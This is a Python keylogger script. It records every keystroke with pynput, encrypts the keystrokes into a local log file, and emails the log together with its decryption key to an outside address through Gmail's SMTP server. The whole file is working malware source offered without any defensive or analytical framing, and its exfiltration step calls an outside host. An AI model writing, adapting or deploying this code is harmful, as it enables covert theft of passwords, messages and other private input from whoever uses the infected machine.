from pynput import keyboard
from cryptography.fernet import Fernet
import os
import smtplib
from email.message import EmailMessage

# Global variable to control the keylogger state
should_stop = False

# Function to load or generate a Fernet key
def load_or_generate_key(key_path='d:/projects/Keylogger/key.key'):
    if os.path.exists(key_path):
        return open(key_path, 'rb').read()
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
    return key

# Function to encrypt text using Fernet
def encrypt_text(key, text):
    return Fernet(key).encrypt(text)

# Function to write encrypted text to file
def write_encrypted_text(filename, text):
    with open(filename, 'ab') as f:
        f.write(text + b'\n')

# Function to send email with attachments
def send_email(sender_email, sender_password, receiver_email, subject, body, attachments=[]):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg.set_content(body)
    
    for file in attachments:
        with open(file, 'rb') as f:
            msg.add_attachment(f.read(), maintype='application', subtype='octet-stream', filename=os.path.basename(file))
    
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender_email, sender_password)
        server.send_message(msg)

# Keylogger event handler
def on_key_press(key):
    global should_stop
    special_keys = {keyboard.Key.enter: b"\n", keyboard.Key.backspace: b" Backspace ", keyboard.Key.space: b" ", keyboard.Key.tab: b" Tab "}
    
    if key == keyboard.Key.esc:
        should_stop = True
        return False
    
    try:
        key_text = special_keys.get(key, key.char.encode() if hasattr(key, 'char') else repr(key).encode())
        write_encrypted_text('d:/projects/Keylogger/keylogger.txt', encrypt_text(load_or_generate_key(), key_text))
    except Exception as e:
        print(f"Error writing key: {e}")

def start_keylogger():
    with keyboard.Listener(on_press=on_key_press) as listener:
        while not should_stop:
            listener.join()

def main():
    start_keylogger()
    send_email(
        sender_email='sender@gmail.com',
        sender_password='sender password',
        receiver_email='receiver@gmail.com',
        subject='Keylogger Data',
        body='Attached are the encrypted keylogger data files.',
        attachments=['d:/projects/Keylogger/keylogger.txt', 'd:/projects/Keylogger/key.key']
    )
    print("Keylogger data sent successfully via email.")

if __name__ == "__main__":
    main()
